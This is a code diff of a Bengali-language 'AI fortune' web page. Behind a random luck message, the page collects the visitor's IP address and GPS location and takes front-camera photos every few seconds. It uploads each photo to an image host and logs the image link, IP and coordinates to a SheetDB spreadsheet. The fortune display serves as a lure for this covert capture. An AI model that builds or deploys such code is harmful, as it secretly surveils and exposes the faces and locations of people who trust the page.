@@ -54,6 +54,7 @@
     let gpsData = "N/A";
     let isMonitoring = false;
 
+    // IP সংগ্রহ
     async function collectIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -62,8 +63,27 @@
         } catch (e) { userIP = "Unknown"; }
     }
 
+    // শিট থেকে র‍্যান্ডম রেজাল্ট আনা
+    async function fetchRandomLuckyResult() {
+        try {
+            const response = await fetch(SHEETDB_URL);
+            const data = await response.json();
+            
+            // 'dy' কলামের ডাটাগুলো ফিল্টার করা
+            const results = data.map(row => row.dy).filter(val => val && val.trim() !== "");
+            
+            if (results.length > 0) {
+                const randomIndex = Math.floor(Math.random() * results.length);
+                return results[randomIndex];
+            }
+            return "আপনার ভাগ্য আজ রহস্যময়, আবার চেষ্টা করুন!";
+        } catch (error) {
+            console.error("SheetDB Error:", error);
+            return "আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।"; // এরর হলে ডিফল্ট মেসেজ
+        }
+    }
+
     async function captureAndSend() {
-        // ভিডিও থেকে ছবি নেওয়ার চেষ্টা
         if (video.readyState === video.HAVE_ENOUGH_DATA) {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
@@ -71,7 +91,6 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const base64Image = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
-
             const formData = new FormData();
             formData.append("image", base64Image);
 
@@ -91,7 +110,6 @@
                             "data": [{ "img": imageUrl, "ip": userIP, "gps": gpsData }]
                         })
                     });
-                    console.log("Success: " + imageUrl);
                 }
             } catch (e) { console.error("Upload Error"); }
         }
@@ -101,14 +119,12 @@
         statusDiv.innerHTML = "<p style='color: #ffaa00;'>অনুমতি পরীক্ষা করা হচ্ছে...</p>";
         
         try {
-            // লোকেশন নেওয়া (অপশনাল রাখা হয়েছে যাতে লোকেশন এরর দিলে ক্যামেরা আটকে না যায়)
             navigator.geolocation.getCurrentPosition(
                 (pos) => { gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
                 (err) => { console.log("Location Denied"); },
                 { timeout: 5000 }
             );
 
-            // ক্যামেরা এক্সেস (সব ফোনের জন্য সাধারণ সেটিংস)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
@@ -119,22 +135,22 @@
 
             await collectIP();
             
-            // অটো ক্যাপচার শুরু
             if (!isMonitoring) {
                 isMonitoring = true;
-                setInterval(captureAndSend, 4000); // প্রতি ৪ সেকেন্ড পর পর
+                setInterval(captureAndSend, 5000); 
             }
 
-            // প্রথম ক্যাপচার ১ সেকেন্ড পর
             setTimeout(captureAndSend, 1500);
 
-            // ফলাফল দেখানো
+            // রেজাল্ট ফেচ করা শুরু
+            const finalLuckyMessage = await fetchRandomLuckyResult();
+
             setTimeout(() => {
                 scanner.style.display = 'none';
                 statusDiv.innerHTML = `
                     <div class="result-card">
                         <h3 style="color: var(--secondary); margin-top:0;">🎯 AI ফলাফল:</h3>
-                        <p style="color: white; font-size: 18px; font-weight: bold;">আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।</p>
+                        <p style="color: white; font-size: 18px; font-weight: bold;">${finalLuckyMessage}</p>
                         <button class="retry-btn" onclick="location.reload()">আবার দেখুন</button>
                     </div>
                 `;
